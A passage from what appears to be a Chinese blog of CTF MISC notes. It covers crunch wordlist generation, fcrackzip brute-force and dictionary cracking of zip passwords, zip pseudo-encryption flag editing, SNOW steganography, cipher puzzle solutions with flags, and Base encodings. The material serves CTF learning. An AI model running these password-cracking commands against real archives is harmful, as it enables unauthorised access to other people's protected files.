contrib</p><p>deb-src <a href="http://mirrors.aliyun.com/kali">http://mirrors.aliyun.com/kali</a> kali-rolling main non-free contrib</p><p>清华大学Kali镜像源</p><p>deb <a href="http://mirrors.tuna.tsinghua.edu.cn/kali">http://mirrors.tuna.tsinghua.edu.cn/kali</a> kali-rolling main contrib non-free</p><p>deb-src <a href="https://mirrors.tuna.tsinghua.edu.cn/kali">https://mirrors.tuna.tsinghua.edu.cn/kali</a> kali-rolling main contrib non-free</p><p>命令1：</p><p>apt-get upgrade</p><p>命令2：</p><p>apt-get dist-upgrade</p><p>上面两条命令均是用来更新所有软件的，不同的是：</p><p>它能识别新版本的依赖关系，</p><p>将不要的依赖进行卸载，</p><p>将需要升级的依赖进行升级。</p><p>安装或更新完成后，会遗留一些软件的安装包，会占用部分硬盘空间，可使用下面的命令来对其进行清理。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">apt-<span class="hljs-built_in">get</span> clean<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>linxu</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>crunch、fcrackzip</title>
    <link href="/2025/03/22/%E7%88%86%E7%A0%B4%E5%AF%86%E9%92%A51/"/>
    <url>/2025/03/22/%E7%88%86%E7%A0%B4%E5%AF%86%E9%92%A51/</url>
    
    <content type="html"><![CDATA[<h1 id="crunch介绍与使用"><a href="#crunch介绍与使用" class="headerlink" title="crunch介绍与使用"></a>crunch介绍与使用</h1><h3 id="1、介绍"><a href="#1、介绍" class="headerlink" title="1、介绍"></a>1、介绍</h3><p>crunch是什么？</p><p>Crunch是一种创建密码字典工具，按照指定的规则生成密码字典，可以灵活的制定自己的字典文件。使用Crunch工具生成的密码可以输出到屏幕，保存到文件、或另一个程序。</p><h3 id="2、使用"><a href="#2、使用" class="headerlink" title="2、使用"></a>2、使用</h3><p>Kali中已自带crunch工具，可直接在kali中使用。</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1716614477509-552d4d9e-6a58-423b-b5f4-f395fe0e0b4d.png"></p><p>命令格式：</p><p>crunch <min-len> <max-len> [<charset string>] [options]</p><p>参数：</p><p>min-len 最小长度字符串，即使不使用参数的值，也需要此选项</p><p>max-len 最大长度字符串，即使不使用参数的值，也需要此选项</p><p>charset string 字符集设置，默认是小写字符集</p><p>options :</p><p>-b 指定文件输出的大小，避免字典文件过大</p><p>-c 指定文件输出的行数，即包含密码的个数</p><p>-d 限制相同元素出现的次数</p><p>-e 定义停止字符，即到该字符串就停止生成</p><p>-f 调用库文件（&#x2F;etc&#x2F;share&#x2F;crunch&#x2F;charset.lst）</p><p>-i 改变输出格式，即aaa,aab -&gt; aaa,baa</p><p>-I 通常与-t联合使用，表明该字符为实义字符</p><p>-m 通常与-p搭配</p><p>-o 将密码保存到指定文件</p><p>-p 指定元素以组合的方式进行</p><p>-q 读取密码文件，即读取pass.txt</p><p>-r 定义重某一字符串重新开始</p><p>-s 指定一个开始的字符，即从自己定义的密码xxxx开始</p><p>-t 指定密码输出的格式</p><p>-u 禁止打印百分比（必须为最后一个选项）</p><p>-z 压缩生成的字典文件，支持gzip,bzip2,lzma,7z</p><p>特殊字符，通常与-t配合使用</p><p>% 代表数字</p><p>^ 代表特殊符号</p><p>@ 代表小写字符</p><p>, 代表大写字符</p><h3 id="3、实例"><a href="#3、实例" class="headerlink" title="3、实例"></a>3、实例</h3><p>crunch 6 6 123 -o number.txt &#x2F;&#x2F;生成六位以123元素为组合的字典集，并输出到number.txt</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1716617221789-837ade83-d7c9-48ea-96df-1d4712847746.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1716617240055-ba818cf4-2cf8-424f-9eff-fe2892f3a0c2.png"></p><p>crunch 1 1 -q read &#x2F;&#x2F;读取read文件中每行内容作为基本字符生成字典</p><p>read文件内容如下：</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1716617261938-a8369232-d4a5-4511-8a79-861a289f3a44.png"></p><p>生成的字典集结果如下：</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1716617304995-4aa62323-a79f-4dad-a8bb-6623d6934746.png"></p><h1 id="fcrackzip的使用（爆破）"><a href="#fcrackzip的使用（爆破）" class="headerlink" title="fcrackzip的使用（爆破）"></a>fcrackzip的使用（爆破）</h1><h4 id="1-暴力破解"><a href="#1-暴力破解" class="headerlink" title="1. 暴力破解"></a>1. 暴力破解</h4><p>暴力破解适用于不知道密码任何信息的情况。指定字符集和密码长度范围即可：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">fcrackzip -b -c <span class="hljs-tag">&lt;<span class="hljs-name">字符集</span>&gt;</span> -l <span class="hljs-tag">&lt;<span class="hljs-name">最小长度</span>&gt;</span>-<span class="hljs-tag">&lt;<span class="hljs-name">最大长度</span>&gt;</span> -u <span class="hljs-tag">&lt;<span class="hljs-name">zip文件</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li><code>-b</code>：使用暴力破解模式。</li><li><code>-c &lt;字符集&gt;</code>：指定字符集，例如 <code>a</code> 代表小写字母，<code>A</code> 代表大写字母，<code>1</code> 代表数字。</li><li><code>-l &lt;最小长度&gt;-&lt;最大长度&gt;</code>：密码长度范围。</li><li><code>-u</code>：测试解压文件的有效性。</li></ul><p><strong>示例：</strong><br>尝试破解长度为 4 到 5 位的数字密码：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">fcrackzip</span> -b -c <span class="hljs-number">1</span> -l <span class="hljs-number">4</span>-<span class="hljs-number">5</span> -u file.zip<br></code></pre></td></tr></table></figure><h4 id="2-字典攻击"><a href="#2-字典攻击" class="headerlink" title="2. 字典攻击"></a>2. 字典攻击</h4><p>字典攻击适用于有密码列表（字典文件）的情况。可以指定字典文件来尝试其中的每个密码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">fcrackzip -D -p <span class="hljs-tag">&lt;<span class="hljs-name">字典文件</span>&gt;</span> -u <span class="hljs-tag">&lt;<span class="hljs-name">zip文件</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li><code>-D</code>：使用字典攻击模式。</li><li><code>-p &lt;字典文件&gt;</code>：指定密码字典文件的路径。</li></ul><p><strong>示例：</strong><br>使用字典文件 <code>passwords.txt</code> 尝试破解：</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">fcrackzip -<span class="hljs-keyword">D</span> -p passwords.txt -<span class="hljs-keyword">u</span> <span class="hljs-keyword">file</span>.<span class="hljs-keyword">zip</span><br></code></pre></td></tr></table></figure><h4 id="3-常用字符集参数"><a href="#3-常用字符集参数" class="headerlink" title="3. 常用字符集参数"></a>3. 常用字符集参数</h4><ul><li><code>a</code>：小写字母（<code>abcdefghijklmnopqrstuvwxyz</code>）</li><li><code>A</code>：大写字母（<code>ABCDEFGHIJKLMNOPQRSTUVWXYZ</code>）</li><li><code>1</code>：数字（<code>0123456789</code>）</li><li><code>!</code>：符号（例如 <code>!@#$%^&amp;*()</code>）</li></ul><p><strong>示例：</strong><br>尝试小写字母和数字组合，密码长度为 3 到 4 位：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">fcrackzip</span> -b -c a1 -l <span class="hljs-number">3</span>-<span class="hljs-number">4</span> -u file.zip<br></code></pre></td></tr></table></figure><h3 id="其他有用的选项"><a href="#其他有用的选项" class="headerlink" title="其他有用的选项"></a>其他有用的选项</h3><ul><li><code>-v</code>：启用详细模式，可以显示破解过程中的进度。</li><li><code>-m</code>：指定压缩方法（0 到 3），通常可以忽略。</li></ul><h3 id="完整示例"><a href="#完整示例" class="headerlink" title="完整示例"></a>完整示例</h3><p>假设我们知道密码是 5 位的小写字母，可以使用如下命令：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">fcrackzip</span> -b -c a -l <span class="hljs-number">5</span>-<span class="hljs-number">5</span> -u -v file.zip<br></code></pre></td></tr></table></figure><p>这会尝试所有 5 位的小写字母组合，并在找到匹配密码时停止。</p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="1、生日密码"><a href="#1、生日密码" class="headerlink" title="1、生日密码"></a>1、生日密码</h2><p>文件的主人喜欢用生日做密码，而且还是个90后。</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715053493021-aed86311-0af2-4eaf-8c25-430469dadb3d.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715053557954-7358c455-a98b-4fc0-8fd6-7fd63cfe0b69.png"></p><p>得出密钥（并不是flag哦），要输入密钥打开加密文件得到flag</p><h2 id="2、银行卡密码-键盘密码"><a href="#2、银行卡密码-键盘密码" class="headerlink" title="2、银行卡密码 键盘密码"></a>2、银行卡密码 键盘密码</h2><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1722315081536-c888b8a1-0876-47be-96f5-8d796085285b.png"></p><p>猜测只有数字密码（需要猜吗）得到密码</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1722315252325-71248c79-a013-4a84-a67d-347611dba893.png"></p><p>得到第一行为键盘密码</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs mel"><span class="hljs-number">93</span> <span class="hljs-number">53</span> <span class="hljs-number">63</span> <span class="hljs-number">71</span> <span class="hljs-number">51</span> <span class="hljs-number">63</span> <span class="hljs-number">41</span> <span class="hljs-number">51</span> <span class="hljs-number">83</span> <span class="hljs-number">63</span> <span class="hljs-number">23</span> <span class="hljs-number">23</span> <span class="hljs-number">93</span> <span class="hljs-number">62</span> <span class="hljs-number">61</span> <span class="hljs-number">94</span> <span class="hljs-number">93</span> <span class="hljs-number">71</span> <span class="hljs-number">41</span> <span class="hljs-number">92</span> <span class="hljs-number">41</span> <span class="hljs-number">71</span> <span class="hljs-number">63</span> <span class="hljs-number">41</span> <span class="hljs-number">51</span> <span class="hljs-number">31</span> <span class="hljs-number">83</span> <span class="hljs-number">43</span> <span class="hljs-number">41</span> <span class="hljs-number">21</span> <span class="hljs-number">81</span> <span class="hljs-number">22</span> <span class="hljs-number">21</span> <span class="hljs-number">74</span> <span class="hljs-number">42</span><br><br>The encryption scheme of next stage is decided by the last  letters.<br><br>T1:@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@   **@@@@**<br><br>T2:@@@@@@@@@@@@@@@@@@@@@@@@   **@@@@@@@**<br><br>T3:@@@@@@@@@@@@@@@@@   **@@@@@@@**<br><br>T4:@@@@@@@@   **@@@@@@ @@@**<br><br>NSSCTF&#123;REVERSE(**@@@@@@@@**)&#125;<br></code></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">str</span> = &#x27;<span class="hljs-number">93</span> <span class="hljs-number">53</span> <span class="hljs-number">63</span> <span class="hljs-number">71</span> <span class="hljs-number">51</span> <span class="hljs-number">63</span> <span class="hljs-number">41</span> <span class="hljs-number">51</span> <span class="hljs-number">83</span> <span class="hljs-number">63</span> <span class="hljs-number">23</span> <span class="hljs-number">23</span> <span class="hljs-number">93</span> <span class="hljs-number">62</span> <span class="hljs-number">61</span> <span class="hljs-number">94</span> <span class="hljs-number">93</span> <span class="hljs-number">71</span> <span class="hljs-number">41</span> <span class="hljs-number">92</span> <span class="hljs-number">41</span> <span class="hljs-number">71</span> <span class="hljs-number">63</span> <span class="hljs-number">41</span> <span class="hljs-number">51</span> <span class="hljs-number">31</span> <span class="hljs-number">83</span> <span class="hljs-number">43</span> <span class="hljs-number">41</span> <span class="hljs-number">21</span> <span class="hljs-number">81</span> <span class="hljs-number">22</span> <span class="hljs-number">21</span> <span class="hljs-number">74</span> <span class="hljs-number">42</span>&#x27;<br><span class="hljs-attribute">table</span> =<span class="hljs-meta"> [&#x27;abc&#x27;,&#x27;def&#x27;,&#x27;ghi&#x27;,&#x27;jkl&#x27;,&#x27;mno&#x27;,&#x27;pqrs&#x27;,&#x27;tuv&#x27;,&#x27;wxyz&#x27;]</span><br><span class="hljs-attribute">str</span> = str.split(&#x27; &#x27;)<br><span class="hljs-attribute">for</span> i in range(len(str)):<br>    <span class="hljs-attribute">print</span>(table[int(str[i][<span class="hljs-number">0</span>])-<span class="hljs-number">2</span>][int(str[i][<span class="hljs-number">1</span>])-<span class="hljs-number">1</span>],end=&#x27;&#x27;)<br></code></pre></td></tr></table></figure><p>得到</p><p>ylopjogjvoccynmzypgxgpogjdvigatbash</p><p>然后用atbash解密一下，得到（要去掉atbash）</p><p>bolkqltqelxxbmnabktctkltqwert</p><p>这一个密码就是 qwert<br>这个是解密的 VBS 脚本</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs vbscript"><span class="hljs-keyword">Function</span> FromQwerty(str)<br>    <span class="hljs-keyword">Dim</span> d, s, t, i, c, r<br>    s = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span><br>    t = <span class="hljs-string">&quot;qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&quot;</span><br>    <span class="hljs-keyword">Set</span> d = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;Scripting.Dictionary&quot;</span>)<br>    <span class="hljs-keyword">For</span> i = <span class="hljs-number">1</span> <span class="hljs-keyword">To</span> <span class="hljs-number">52</span><br>        d(<span class="hljs-built_in">Mid</span>(t, i, <span class="hljs-number">1</span>)) = <span class="hljs-built_in">Mid</span>(s, i, <span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">Next</span><br>    <span class="hljs-keyword">For</span> i = <span class="hljs-number">1</span> <span class="hljs-keyword">To</span> <span class="hljs-built_in">Len</span>(str)<br>        c = <span class="hljs-built_in">Mid</span>(str, i, <span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">If</span> d.Exists(c) <span class="hljs-keyword">Then</span><br>            r = r &amp; d(c)<br>        <span class="hljs-keyword">Else</span><br>            r = r &amp; c<br>        <span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br>    <span class="hljs-keyword">Next</span><br>    FromQwerty = r<br><span class="hljs-keyword">End</span> <span class="hljs-keyword">Function</span><br><br>WScript.Echo FromQwerty(<span class="hljs-string">&quot;bolkqltqelxxbmnabktctklt&quot;</span>)<br></code></pre></td></tr></table></figure><p>可以先用 txt 粘贴进去，再改名为 1.vbs，点击即可得到</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1722316540944-3766bb25-5657-4eec-9f28-1e3128615dff.png"></p><p>xisraseacsuuxzykxreverse</p><p>这一个就是 reverse，即把这句话反过来</p><p>print(‘xisraseacsuuxzykx’[::-1])</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1722316590347-232b97e5-3ce1-499d-bcd9-b4c5483c744c.png"></p><p>得到</p><p>xkyzxuuscaesarsix</p><p>看 T4，它是有空格的，所以这个加密是caesar six，即偏移量为6的凯撒密码</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1722316697736-40093dcc-c4b4-44d6-8cfb-db2ed4c082e8.png"></p><p>得到restroom</p><p>最后还有一个reverse</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1722316748891-3f830f80-4d5d-491a-84b9-221f62e1f456.png"></p><p>NSSCTF{moortser}</p>]]></content>
    
    
    
    <tags>
      
      <tag>MISC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>zip解密</title>
    <link href="/2025/03/22/zip%E8%A7%A3%E5%AF%86/"/>
    <url>/2025/03/22/zip%E8%A7%A3%E5%AF%86/</url>
    
    <content type="html"><![CDATA[<h1 id="ZIP伪加密解析"><a href="#ZIP伪加密解析" class="headerlink" title="ZIP伪加密解析"></a>ZIP伪加密解析</h1><h2 id="1、zip组成"><a href="#1、zip组成" class="headerlink" title="1、zip组成"></a>1、zip组成</h2><p>一个 ZIP 文件由三个部分组成：压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志。</p><p><a href="https://blog.csdn.net/wclxyn/article/details/7288994">一个zip文件由这样三个部分组成_zip 文件结构_一只独孤的程序猿的博客-CSDN博客</a></p><h2 id="2、实例"><a href="#2、实例" class="headerlink" title="2、实例"></a>2、实例</h2><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715080319355-6dcd924b-4078-4eb9-a5e9-76d4f3a22d16.png"></p><p><strong>压缩源文件数据区：</strong><br>50 4B 03 04：这是头文件标记（0x04034b50）<br>14 00：解压文件所需 pkware 版本<br>00 00：全局方式位标记（有无加密） <strong>头文件标记后2bytes</strong><br><strong>压缩源文件目录区：</strong></p><p>50 4B 01 02：目录中文件文件头标记(0x02014b50)</p><p>3F 00：压缩使用的 pkware 版本</p><p>14 00：解压文件所需 pkware 版本<br>00 00：全局方式位标记（有无加密，伪加密的关键） <strong>目录文件标记后4bytes</strong><br><strong>压缩源文件目录结束标志：</strong><br>50 4B 05 06：目录结束标记</p><h2 id="3、全局方式位标记"><a href="#3、全局方式位标记" class="headerlink" title="3、全局方式位标记"></a>3、全局方式位标记</h2><p>全局方式位标记的四个数字中只有第二个数字对其有影响，其它的不管为何值，都不影响它的加密属性！<br><strong>第二个数字为奇数时 –&gt;加密</strong><br><strong>第二个数字为偶数时 –&gt;未加密</strong></p><h2 id="4、辨别zip是真加密还是伪加密"><a href="#4、辨别zip是真加密还是伪加密" class="headerlink" title="4、辨别zip是真加密还是伪加密"></a>4、辨别zip是真加密还是伪加密</h2><h3 id="1）无加密"><a href="#1）无加密" class="headerlink" title="1）无加密"></a>1）无加密</h3><p>压缩源文件数据区的全局加密应当为00 00 （504B0304两个bytes之后）<br>且压缩源文件目录区的全局方式位标记应当为00 00（504B0304四个bytes之后）</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715080319328-03d43b8d-5052-4baa-b2eb-195421aaf04c.png"></p><h3 id="2）伪加密"><a href="#2）伪加密" class="headerlink" title="2）伪加密"></a>2）伪加密</h3><p>压缩源文件数据区的全局加密应当为00 00<br>且压缩源文件目录区的全局方式位标记应当为09 00</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715080319328-1e9272a7-c29d-4a5e-86d9-5b74ceb71adb.png"></p><h3 id="3）真加密"><a href="#3）真加密" class="headerlink" title="3）真加密"></a>3）真加密</h3><p>压缩源文件数据区的全局加密应当为09 00<br>且压缩源文件目录区的全局方式位标记应当为09 00 !</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715080319344-27b995e7-2657-4e8e-ac7a-8678c9e3f0fb.png"></p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>把压缩包拖到winhex里打利用WinHex搜索，快速定位到目录区头文件标记处开，50 4B 03 04，这是压缩源文件数据区头文件标记，50 4B 01 02，这是压缩源文件目录区头文件标记，以50为第一处，找到第9、10处数值位置，第9处数值如果是奇数就代表有密码，偶数代表无密码</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715080159737-bf7beda1-57f9-4d7b-b94e-369cd0bab969.png"></p><p>第九位是偶数属于伪加密</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715080259574-f206e589-159a-4f39-b5d5-eab6ba7198f2.png"></p><p>把09 00 改成00 00保存后就能打开了</p>]]></content>
    
    
    
    <tags>
      
      <tag>MISC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>snow雪</title>
    <link href="/2025/03/22/snow%E9%9B%AA/"/>
    <url>/2025/03/22/snow%E9%9B%AA/</url>
    
    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/qq_53079406/article/details/123810053">【HTML中隐写】Snow免安装、网站版，基本使用方法_snow隐写-CSDN博客</a></p><h1 id="Options（选项）"><a href="#Options（选项）" class="headerlink" title="Options（选项）"></a>Options（选项）</h1><p>-C</p><p>如果隐藏，则压缩数据，或者如果提取，则会解压缩。</p><p>-Q</p><p>静音模式。如果未设置，则程序报告统计信息，例如压缩百分比和可用存储空间的数量。</p><p>-S</p><p>报告文本文件中隐藏消息的近似空间量。考虑线长度，但忽略其他选项。</p><p>-p password</p><p>如果设置为此，则在隐藏期间将使用此密码加密数据，或在提取期间解密。</p><p>-l line-length</p><p>在附加空格时，Snow将始终产生比此值短的线条。默认情况下，它设置为80。</p><p>-f message-file</p><p>此文件的内容将隐藏在输入文本文件中。</p><p>-m message-string</p><p>此字符串的内容将被隐藏在输入文本文件中。请注意，除非在字符串中包含一个换行符，否则在提取邮件时，否则不会打印换行符。</p><h1 id="Examples（例子）"><a href="#Examples（例子）" class="headerlink" title="Examples（例子）"></a>Examples（例子）</h1><p>以下命令将隐藏文件infile中的消息“I am lying”中，压缩，并使用密码“Hello World”加密。生成的文本将被存储在外档中。</p><p>snow -C -m “I am lying” -p “hello world” infile outfile</p><p>要提取消息，命令将是</p><p>snow -C -p “hello world” outfile</p><p>请注意，生成的消息不会被换行符终止。</p><p>为防止线包装，如果通过邮件或新闻读卡器缩进隐藏空间的文本，可以使用72或更小的线长度。</p><p>snow -C -l 72 -m “I am lying” infile outfile</p><p>可以使用-s选项确定文件的近似存储容量。</p><p>snow -S -l 72 infile</p><h1 id="使用："><a href="#使用：" class="headerlink" title="使用："></a>使用：</h1><p>第一步：</p><p>先将文件都放在Snow文件夹中，再进行操作</p><p>原始文件也留一个做对比</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1730516262056-f5141e85-982d-4f62-ad6a-0e72bedecf65.png"></p><p>第二步：先进入到文件夹中</p><p>然后再执行隐写命令</p><p>snow.exe -C -m “flag” -p “123456” test.html</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1730516278922-8367041a-2052-474d-9ab6-54bbe0e2dee7.png"></p><p>这里显示压缩了34.38%</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1730516311489-4035423b-1d95-4d33-9cb7-e0d6459b7246.png"></p><p>最后显示：消息使用大约1.60％的可用空间。</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1730516328589-3f583f4e-d69f-43c6-89ae-64f578c2fb02.png"></p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="看雪看雪看雪"><a href="#看雪看雪看雪" class="headerlink" title="看雪看雪看雪"></a>看雪看雪看雪</h2><p>看着是16进制，转成字符串<img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1730514375667-01f2b8e2-a0b4-4696-8d5f-b4c9e5052dfc.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1730514456590-82060d58-8b92-4756-a732-d68b5d9dc771.png"></p><p>直接打开rar，放到7zip里面看一下</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1730515792883-68ebc3c4-f1b5-4019-b964-f23e9690c106.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1730515855894-16330991-1ce8-4095-baae-f79dda552885.png"></p><p>key是他朝若是同淋雪</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1730516023113-79d109fd-195c-40d3-abda-938229a25257.png"></p><p>放到snow里面</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1730516102071-e2e78419-300b-4e15-b392-55fc18a6755d.png"></p><p>.\SNOW.exe - C -p 他朝若是同淋雪 flag.txt</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1730516916400-5ad91e9f-f381-4cbb-bdf5-79b5a5cd2fbc.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>MISC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>编码</title>
    <link href="/2025/03/22/%E7%BC%96%E7%A0%81/"/>
    <url>/2025/03/22/%E7%BC%96%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<h1 id="Base系列编码浅析"><a href="#Base系列编码浅析" class="headerlink" title="Base系列编码浅析"></a>Base系列编码浅析</h1><p><strong>Base编码有很多种，常用****的有：</strong></p><p><strong>base16 base32 base64 base85 base36 base 58 base91 base 92 base62</strong></p><hr><h2 id="Base16"><a href="#Base16" class="headerlink" title="Base16"></a><strong>Base16</strong></h2><ul><li>使用16个ASCII可打印字符**（数字0-9和字母A-F）**，对任意字节数据进行编码。</li><li>先获取输入字符串每个字节的二进制值（不足8比特在高位补0），然后将其串联进来，再按照4比特一组进行切分，将每组二进制数分别转换成十进制。</li><li>Base16编码后的数据量是原数据的两倍：1000比特数据需要250个字符（即 250*8&#x3D;2000 比特）。</li></ul><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715054999723-cd966302-d3f9-4b90-8956-93a0e2886295.png"></p><p><strong>注</strong>：可以看到8比特数据按照4比特切分刚好是两组，所以Base16不可能用到填充符号“&#x3D;”。</p><p>换句话说：Base16使用两个ASCII字符去编码原数据中的一个字节数据。</p><p>Base16编码是一个标准的十六进制字符串（注意是字符串而不是数值），更易被人类和计算机使用，因为它并不包含任何控制字符，以及Base64和Base32中的“&#x3D;”符号。</p><hr><h2 id="Base32"><a href="#Base32" class="headerlink" title="Base32"></a>Base32</h2><ul><li>Base32编码是使用32个可打印字符（字母A-Z和数字2-7）对任意字节数据进行编码的方案，编码后的字符串不用区分大小写并排除了容易混淆的字符，可以方便地由人类使用并由计算机处理。</li><li>Base32主要用于编码二进制数据，但是Base32也能够编码诸如ASCII之类的二进制文本。</li><li>Base32将任意字符串按照字节进行切分，并将每个字节对应的二进制值（不足8比特高位补0）串联起来，按照5比特一组进行切分，并将每组二进制值转换成十进制来对应32个可打印字符中的一个。</li></ul><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715054999740-119b1eb7-f7ac-4fa8-9bfc-f38451263cd2.png"></p><p>由于数据的二进制传输是按照8比特一组进行（即一个字节），因此Base32按5比特切分的二进制数据必须是40比特的倍数（5和8的最小公倍数）。</p><p>例如输入单字节字符“%”，它对应的二进制值是“100101”，前面补两个0变成“00100101”（二进制值不足8比特的都要在高位加0直到8比特），从左侧开始按照5比特切分成两组：“00100”和“101”，后一组不足5比特，则在末尾填充0直到5比特，变成“00100”和“10100”，这两组二进制数分别转换成十进制数，通过上述表格即可找到其对应的可打印字符“E”和“U”，但是这里只用到两组共10比特，还差30比特达到40比特，按照5比特一组还需6组，则在末尾填充6个“&#x3D;”。填充“&#x3D;”符号的作用是方便一些程序的标准化运行，大多数情况下不添加也无关紧要，而且，在URL中使用时必须去掉“&#x3D;”符号。</p><hr><h2 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a>Base64</h2><ul><li>Base64是一种基于64个可打印字符来表示二进制数据的表示方法。由于，所以每6个比特为一个单元，对应某个可打印字符。3个字节有24个比特，对应于4个Base64单元，即3个字节可由4个可打印字符来表示。</li><li>在Base64中的可打印字符包括字母A-Z、a-z、数字0-9，这样共有62个字符，此外两个可打印符号在不同的系统中而不同。一些如uuencode的其他编码方法。</li><li>它可用来作为电子邮件的传输编码。</li><li>Base64常用于在通常处理文本数据的场合，表示、传输、存储一些二进制数据，包括MIME的电子邮件及XML的一些复杂数据。</li></ul><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715055000028-1298ffe1-0538-4f50-8d8e-663a4a155837.png"></p><p>注：BinHex的版本使用不同的64字符集来代表6个二进制数字，但是不被称为Base64。</p><p>如果要编码的字节数不能被3整除，最后会多出1个或2个字节，那么可以使用下面的方法进行处理：</p><p>（1）先使用0字节值在末尾补足，使其能够被3整除，然后再进行Base64的编码。</p><p>（2）在编码后的Base64文本后加上一个或两个&#x3D;号，代表补足的字节数。</p><p>也就是说：</p><p>当最后剩余两个八位(待补足)字节（2个byte）时，最后一个6位的Base64字节块有四位是0值，最后附加上两个等号；</p><p>如果最后剩余一个八位(待补足)字节（1个byte）时，最后一个6位的base字节块有两位是0值，最后附加一个等号。</p><p>参考下表：</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715054999888-ec0a017d-0f83-4377-8063-92d014907e6d.png"></p><hr><h2 id="Base85"><a href="#Base85" class="headerlink" title="Base85"></a><strong>Base85</strong></h2><ul><li>base85 也称为Ascii85，是Paul E. 